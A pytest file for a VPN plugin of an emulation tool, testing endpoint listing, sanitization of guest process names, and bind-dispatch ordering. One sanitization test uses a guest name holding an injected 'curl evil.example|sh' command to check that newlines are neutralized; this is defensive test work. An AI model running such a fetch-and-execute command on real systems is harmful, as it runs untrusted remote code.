"""Host-side tests for the VPN plugin (endpoints listing and bind dispatch).

The VPN plugin's __init__ launches host-side processes (vpn/vsock bridges), so
it isn't null-backend-loadable via penguin.testing.load_pyplugin. The helpers
under test here are pure or easily isolated, so we exercise them directly on an
instance built with __new__ (no __init__), setting only the attributes they
read. The in-guest path is covered by the tests/integration test_target
netbinds.yaml verifier conditions.
"""
import importlib.util
import sys
import types
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
VPN = REPO_ROOT / "pyplugins" / "actuation" / "vpn.py"


def _load_vpn_module(name):
    # vpn.py imports `jc` (not a test dependency) at module scope but the
    # endpoints helper never touches it; stub it so the import succeeds off-guest.
    sys.modules.setdefault("jc", types.ModuleType("jc"))
    spec = importlib.util.spec_from_file_location(name, str(VPN))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _vpn(mod, tmp_path, bridges):
    vpn = mod.VPN.__new__(mod.VPN)
    vpn.outdir = str(tmp_path)
    vpn.exposed_ip = "192.168.100.2"
    vpn.bridges_made = bridges
    return vpn


def test_endpoints_listing(tmp_path):
    mod = _load_vpn_module("vpn_plugin_endpoints")
    vpn = _vpn(mod, tmp_path, {
        ("tcp", "0.0.0.0", 23): {"procname": "telnetd", "ipvn": 4, "host_port": 2323},
        ("tcp", "[::]", 80): {"procname": "httpd", "ipvn": 6, "host_port": 8080},
        ("udp", "0.0.0.0", 53): {"procname": "dnsmasq", "ipvn": 4, "host_port": 53},
    })
    vpn._write_endpoints()

    endpoints = (tmp_path / "endpoints.txt").read_text()
    assert "tcp 192.168.100.2:2323 -> 0.0.0.0:23 (telnetd)\n" in endpoints
    assert "tcp 192.168.100.2:8080 -> [::]:80 (httpd)\n" in endpoints
    assert "udp 192.168.100.2:53 -> 0.0.0.0:53 (dnsmasq)\n" in endpoints


def test_endpoints_sanitizes_guest_procname(tmp_path):
    """A guest can set its comm to include newlines/control chars (prctl
    PR_SET_NAME); those must be neutralized in the generated listing."""
    mod = _load_vpn_module("vpn_plugin_endpoints_sanitize")
    evil = "x\ncurl evil.example|sh #"
    vpn = _vpn(mod, tmp_path, {
        ("tcp", "0.0.0.0", 8080): {"procname": evil, "ipvn": 4, "host_port": 8080},
    })
    vpn._write_endpoints()

    endpoints = (tmp_path / "endpoints.txt").read_text()
    # One line, newline neutralized to '?'.
    assert endpoints == "tcp 192.168.100.2:8080 -> 0.0.0.0:8080 (x?curl evil.example|sh #)\n"
    assert mod._sanitize_label("tab\there") == "tab?here"


# --- on_bind dispatch ------------------------------------------------------
#
# When a bind arrives on a not-yet-seen concrete IP, on_bind first re-bridges
# every previously-wildcarded service onto that IP, then bridges the bind that
# actually fired. The re-bridge loop must not clobber the real bind's own
# arguments: a Python loop target leaks into the enclosing function scope, so
# reusing a parameter name there silently rewrites the pending bind. Because
# wild_ips is a set, which entry lands last varies per process (string hash
# randomization), which made the resulting corruption non-deterministic.


def _bind_vpn(mod, wild_ips):
    """A VPN instance wired up for on_bind, with bridge/publish captured."""
    vpn = mod.VPN.__new__(mod.VPN)
    vpn.exposed_ip = "192.168.100.2"
    vpn.seen_ips = set()
    vpn.wild_ips = wild_ips
    vpn.active_listeners = set()

    vpn.bridged = []
    vpn.published = []

    def fake_bridge(sock_type, ip, guest_port, procname, ipvn):
        vpn.bridged.append((sock_type, ip, guest_port, procname))
        return 10000 + guest_port

    vpn.bridge = fake_bridge

    class _Plugins:
        def publish(self, _self, _event, proto, guest_ip, guest_port, host_port, host_ip, procname):
            vpn.published.append((proto, guest_ip, guest_port, procname))

    mod.plugins = _Plugins()
    return vpn


def test_on_bind_new_ip_keeps_its_own_protocol():
    """A TCP bind on a newly-seen IP must be bridged as TCP even though the
    wildcard re-bridge loop above it just handled a UDP service."""
    mod = _load_vpn_module("vpn_plugin_on_bind_proto")
    vpn = _bind_vpn(mod, {("udp", 4444, "netcat")})

    vpn.on_bind("tcp", 4, "192.168.0.1", 9999, "lighttpd")

    # Last bridge/publish belong to the bind that actually fired.
    assert vpn.bridged[-1] == ("tcp", "192.168.0.1", 9999, "lighttpd")
    assert vpn.published[-1] == ("tcp", "192.168.0.1", 9999, "lighttpd")


@pytest.mark.parametrize("order", [
    [("tcp", 8000, "httpd"), ("udp", 4444, "netcat")],
    [("udp", 4444, "netcat"), ("tcp", 8000, "httpd")],
])
def test_on_bind_new_ip_protocol_survives_any_wild_order(order):
    """Whatever order wild_ips iterates in, the pending bind's protocol stands.

    wild_ips is a set in production, so its order is not ours to choose; a list
    is substituted here to pin down both orderings deterministically.
    """
    mod = _load_vpn_module("vpn_plugin_on_bind_order")
    vpn = _bind_vpn(mod, order)

    vpn.on_bind("tcp", 4, "192.168.0.1", 9999, "lighttpd")

    assert vpn.bridged[-1] == ("tcp", "192.168.0.1", 9999, "lighttpd")
    assert vpn.published[-1] == ("tcp", "192.168.0.1", 9999, "lighttpd")


def test_on_bind_rebridged_wildcard_keeps_its_own_procname():
    """A wildcard service re-bridged onto a new IP is still owned by the
    process that bound the wildcard, not by whoever bound the new IP. The
    published event must agree with what bridge() recorded."""
    mod = _load_vpn_module("vpn_plugin_on_bind_procname")
    vpn = _bind_vpn(mod, {("tcp", 80, "httpd")})

    vpn.on_bind("tcp", 4, "192.168.0.1", 9999, "lighttpd")

    assert vpn.bridged[0] == ("tcp", "192.168.0.1", 80, "httpd")
    assert vpn.published[0] == ("tcp", "192.168.0.1", 80, "httpd")
